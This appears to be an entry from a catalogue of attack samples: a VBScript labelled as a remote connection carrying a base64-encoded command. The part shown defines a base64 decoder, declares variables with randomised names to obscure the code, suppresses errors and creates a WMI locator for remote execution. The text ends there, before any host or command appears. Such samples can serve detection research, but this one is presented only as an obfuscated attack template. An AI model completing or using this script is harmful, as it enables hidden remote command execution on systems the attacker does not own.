[ENCODED_REMOTE]
Description: Remote connection with base64 encoded command
Type: remote_obfuscated
--------------------------------------------------------------------------------
Function DecodeBase64(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64 = node.NodeTypedValue
End Function

Dim objLoc_qTBGfwoY, objConn_BPkrThEK, objSvc_PmkJsaiE, objProc_GZoMctRc, encCmd_fDbqZHFy
On Error Resume Next
Set objLoc_qTBGfwoY = CreateObject("WbemScripting.SWbemLocator")
